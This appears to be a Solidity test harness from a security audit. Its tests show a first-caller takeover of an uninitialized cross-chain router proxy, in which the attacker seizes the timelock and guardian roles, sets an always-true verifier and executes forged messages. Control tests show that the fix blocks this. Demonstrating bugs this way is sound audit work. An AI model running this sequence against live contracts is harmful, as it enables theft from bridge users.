// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    AlwaysFalseVerifier,
    AlwaysTrueVerifier,
    MessageCodec,
    MinimalHandler,
    TelepathyRouterV2Model,
    VerifierType
} from "../src/TelepathyInitHijackHarness.sol";

contract Actor {
    function initializeRouter(
        TelepathyRouterV2Model router,
        bool sendingEnabled,
        bool executingEnabled,
        address feeVault,
        address timelock,
        address guardian
    ) external returns (bool) {
        (bool success,) = address(router).call(
            abi.encodeWithSelector(
                router.initialize.selector,
                sendingEnabled,
                executingEnabled,
                feeVault,
                timelock,
                guardian
            )
        );
        return success;
    }

    function setDefaultVerifier(
        TelepathyRouterV2Model router,
        VerifierType verifierType,
        address verifier
    ) external returns (bool) {
        (bool success,) = address(router).call(
            abi.encodeWithSelector(router.setDefaultVerifier.selector, verifierType, verifier)
        );
        return success;
    }

    function setZkRelayer(TelepathyRouterV2Model router, address relayer, bool enabled)
        external
        returns (bool)
    {
        (bool success,) =
            address(router).call(abi.encodeWithSelector(router.setZkRelayer.selector, relayer, enabled));
        return success;
    }

    function execute(TelepathyRouterV2Model router, bytes memory proofData, bytes memory message)
        external
        returns (bool)
    {
        (bool success,) =
            address(router).call(abi.encodeWithSelector(router.execute.selector, proofData, message));
        return success;
    }
}

contract TelepathyInitHijackTest {
    using MessageCodec for bytes;
    uint8 internal constant ROUTER_VERSION = 2;

    function _assertTrue(bool condition, string memory message) internal pure {
        require(condition, message);
    }

    function _message(
        uint64 nonce,
        uint32 sourceChainId,
        address sourceAddress,
        address destinationAddress,
        bytes memory data
    ) internal view returns (bytes memory) {
        return MessageCodec.encode(
            ROUTER_VERSION,
            nonce,
            sourceChainId,
            sourceAddress,
            uint32(block.chainid),
            destinationAddress,
            data
        );
    }

    /// @notice F1 witness:
    /// if proxy is left uninitialized, first caller can seize timelock/guardian roles and
    /// configure malicious verifier routing to execute forged messages.
    function test_f1_bug_model_uninitialized_first_caller_seizes_roles_and_executes_forged_message()
        public
    {
        TelepathyRouterV2Model router = new TelepathyRouterV2Model();
        Actor attacker = new Actor();
        Actor deployer = new Actor();

        bool attackerInitialized =
            attacker.initializeRouter(router, true, true, address(0), address(attacker), address(attacker));
        _assertTrue(attackerInitialized, "attacker should initialize first");
        _assertTrue(router.timelock() == address(attacker), "attacker should control timelock");
        _assertTrue(router.guardian() == address(attacker), "attacker should control guardian");

        bool deployerInitLater =
            deployer.initializeRouter(router, true, true, address(0), address(deployer), address(deployer));
        _assertTrue(!deployerInitLater, "deployer second initialize must fail");

        AlwaysTrueVerifier alwaysTrue = new AlwaysTrueVerifier();
        bool setVerifier = attacker.setDefaultVerifier(
            router, VerifierType.ATTESTATION_STATE_QUERY, address(alwaysTrue)
        );
        _assertTrue(setVerifier, "attacker timelock should set verifier");

        MinimalHandler handler =
            new MinimalHandler(address(router), VerifierType.ATTESTATION_STATE_QUERY);
        bytes memory forged = _message(
            1,
            42161,
            address(0xBADC0DE),
            address(handler),
            abi.encodePacked("forged-payload")
        );

        bool executed = attacker.execute(router, hex"", forged);
        _assertTrue(executed, "forged message should execute under hijacked verifier control");
        _assertTrue(handler.calls() == 1, "handler should be called exactly once");
        _assertTrue(handler.lastSourceChain() == 42161, "forged source chain should be accepted");
        _assertTrue(handler.lastSourceAddress() == address(0xBADC0DE), "forged source should be accepted");
    }

    /// @notice Fixed control: trusted first initializer owns privileged roles, blocking takeover.
    function test_f1_fixed_model_trusted_first_initialize_blocks_role_takeover() public {
        TelepathyRouterV2Model router = new TelepathyRouterV2Model();
        Actor trusted = new Actor();
        Actor guardian = new Actor();
        Actor attacker = new Actor();

        bool trustedInit =
            trusted.initializeRouter(router, true, true, address(0), address(trusted), address(guardian));
        _assertTrue(trustedInit, "trusted initialize should succeed");

        bool attackerSecondInit =
            attacker.initializeRouter(router, true, true, address(0), address(attacker), address(attacker));
        _assertTrue(!attackerSecondInit, "attacker cannot initialize after trusted init");
        _assertTrue(router.timelock() == address(trusted), "timelock should remain trusted");
        _assertTrue(router.guardian() == address(guardian), "guardian should remain trusted");
    }

    /// @notice Fixed control witness:
    /// non-timelock attacker cannot set verifier and cannot execute forged message.
    function test_f1_fixed_model_non_timelock_cannot_enable_forged_execute() public {
        TelepathyRouterV2Model router = new TelepathyRouterV2Model();
        Actor trustedTimelock = new Actor();
        Actor trustedGuardian = new Actor();
        Actor attacker = new Actor();

        bool trustedInit = trustedTimelock.initializeRouter(
            router, true, true, address(0), address(trustedTimelock), address(trustedGuardian)
        );
        _assertTrue(trustedInit, "trusted initialize should succeed");

        AlwaysTrueVerifier alwaysTrue = new AlwaysTrueVerifier();
        bool attackerSetTrue = attacker.setDefaultVerifier(
            router, VerifierType.ATTESTATION_STATE_QUERY, address(alwaysTrue)
        );
        _assertTrue(!attackerSetTrue, "attacker must not set verifier");

        AlwaysFalseVerifier alwaysFalse = new AlwaysFalseVerifier();
        bool trustedSetFalse = trustedTimelock.setDefaultVerifier(
            router, VerifierType.ATTESTATION_STATE_QUERY, address(alwaysFalse)
        );
        _assertTrue(trustedSetFalse, "trusted timelock should set verifier");

        MinimalHandler handler =
            new MinimalHandler(address(router), VerifierType.ATTESTATION_STATE_QUERY);
        bytes memory forged =
            _message(2, 42161, address(0xFACEB00C), address(handler), abi.encodePacked("forged"));

        bool executed = attacker.execute(router, hex"", forged);
        _assertTrue(!executed, "forged execute should fail when verifier remains trusted");
        _assertTrue(handler.calls() == 0, "handler should not be called");
    }

    /// @notice Fuzz witness:
    /// after attacker first-initializes and controls verifier + relayer settings,
    /// forged messages across source-chain classes execute successfully.
    function testFuzz_f1_bug_model_attacker_initialized_router_accepts_forged_messages(
        uint64 nonce,
        uint32 sourceChainId,
        bytes calldata payload
    ) public {
        if (payload.length > 128) {
            return;
        }

        TelepathyRouterV2Model router = new TelepathyRouterV2Model();
        Actor attacker = new Actor();

        bool initOk =
            attacker.initializeRouter(router, true, true, address(0), address(attacker), address(attacker));
        _assertTrue(initOk, "attacker should initialize");

        AlwaysTrueVerifier alwaysTrue = new AlwaysTrueVerifier();
        _assertTrue(
            attacker.setDefaultVerifier(router, VerifierType.ATTESTATION_STATE_QUERY, address(alwaysTrue)),
            "set attestation verifier"
        );
        _assertTrue(
            attacker.setDefaultVerifier(router, VerifierType.ZK_EVENT, address(alwaysTrue)),
            "set zk event verifier"
        );
        _assertTrue(
            attacker.setDefaultVerifier(router, VerifierType.ZK_STORAGE, address(alwaysTrue)),
            "set zk storage verifier"
        );
        _assertTrue(
            attacker.setZkRelayer(router, address(attacker), true), "attacker should whitelist self"
        );

        MinimalHandler handler = new MinimalHandler(address(router), VerifierType.NULL);
        bytes memory forged = _message(
            nonce,
            sourceChainId,
            address(uint160(uint256(keccak256(payload)))),
            address(handler),
            payload
        );

        bool executed = attacker.execute(router, hex"", forged);
        _assertTrue(executed, "forged message should execute");
        _assertTrue(handler.calls() == 1, "handler should be called");
    }

    /// @notice Fuzz fixed control:
    /// without attacker-controlled initialization, forged execution cannot be forced.
    function testFuzz_f1_fixed_model_trusted_initialized_router_rejects_attacker_forged_messages(
        uint64 nonce,
        bytes calldata payload
    ) public {
        if (payload.length > 128) {
            return;
        }

        TelepathyRouterV2Model router = new TelepathyRouterV2Model();
        Actor trustedTimelock = new Actor();
        Actor trustedGuardian = new Actor();
        Actor attacker = new Actor();

        _assertTrue(
            trustedTimelock.initializeRouter(
                router, true, true, address(0), address(trustedTimelock), address(trustedGuardian)
            ),
            "trusted initialize should succeed"
        );

        // Trusted timelock keeps verifier strict/false.
        AlwaysFalseVerifier alwaysFalse = new AlwaysFalseVerifier();
        _assertTrue(
            trustedTimelock.setDefaultVerifier(
                router, VerifierType.ATTESTATION_STATE_QUERY, address(alwaysFalse)
            ),
            "trusted verifier set"
        );

        // Attacker cannot alter verifier or guardian whitelist.
        _assertTrue(
            !attacker.setDefaultVerifier(
                router, VerifierType.ATTESTATION_STATE_QUERY, address(new AlwaysTrueVerifier())
            ),
            "attacker must fail verifier update"
        );
        _assertTrue(!attacker.setZkRelayer(router, address(attacker), true), "attacker must fail relayer set");

        MinimalHandler handler =
            new MinimalHandler(address(router), VerifierType.ATTESTATION_STATE_QUERY);
        bytes memory forged =
            _message(nonce, 42161, address(uint160(uint256(keccak256(payload)))), address(handler), payload);

        bool executed = attacker.execute(router, hex"", forged);
        _assertTrue(!executed, "forged message should fail");
        _assertTrue(handler.calls() == 0, "handler should remain untouched");
    }
}
